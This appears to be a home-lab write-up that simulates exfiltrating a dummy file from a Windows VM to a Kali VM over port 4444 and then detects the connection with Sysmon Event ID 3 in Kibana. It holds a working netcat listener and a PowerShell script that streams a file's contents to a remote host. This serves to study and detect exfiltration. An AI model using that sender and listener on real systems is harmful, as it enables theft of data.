# Hint 3 – Data Exfiltration Detection

## ✅ Objective

Simulate an unauthorized data exfiltration attempt from the Windows VM to Kali Linux using a non-standard port, and detect the event using Sysmon and ELK stack.

---

## 🧰 Tools Used

* Windows 10 VM
* Kali Linux VM (netcat listener)
* PowerShell TCP client script
* Sysmon + Winlogbeat
* Kibana (ELK stack)

---

## 🔍 Steps Performed

### 1. Created Dummy File on Windows

```powershell
echo "Sensitive fake data for testing" > C:\Users\Public\secrets.txt
```

### 2. Started Netcat Listener on Kali

```bash
nc -lvp 4444 > received_file.txt
```

Result:

* Kali received a connection from Windows (`192.168.43.206`) to `port 4444`
* Contents of `secrets.txt` were saved in `received_file.txt`

### 3. Sent Data from Windows using PowerShell

```powershell
$client = New-Object System.Net.Sockets.TcpClient("192.168.43.200", 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
Get-Content "C:\Users\Public\secrets.txt" | ForEach-Object { $writer.WriteLine($_) }
$writer.Flush(); $writer.Close(); $stream.Close(); $client.Close()
```

### 4. Verified Logs in Kibana

Search used:

```kibana
event.code: "3" AND destination.port: "4444"
```

Result:

* Sysmon Event ID 3 logged
* Connection from Windows to Kali on TCP port 4444
* Process: `powershell.exe`

---

## 🟛 Screenshots

* `kali_nc_receive.png`: Kali terminal showing netcat receiving data
* `powershell_send_data.png`: PowerShell successfully sending the file
* `kibana_exfiltration_log.png`: Kibana showing Event ID 3 for the exfiltration

---

## 📊 Observations

* Sysmon successfully captured outbound TCP connection to port 4444
* Data was received on Kali, proving the exfiltration occurred
* Log visibility confirmed in Kibana via Winlogbeat

---

## ✅ Conclusion

This scenario successfully simulated a basic data exfiltration attempt. The activity was detected using Sysmon Event ID 3, forwarded to ELK, and confirmed via Kibana. This proves endpoint and network monitoring can detect unauthorized outbound traffic over non-standard ports.
 
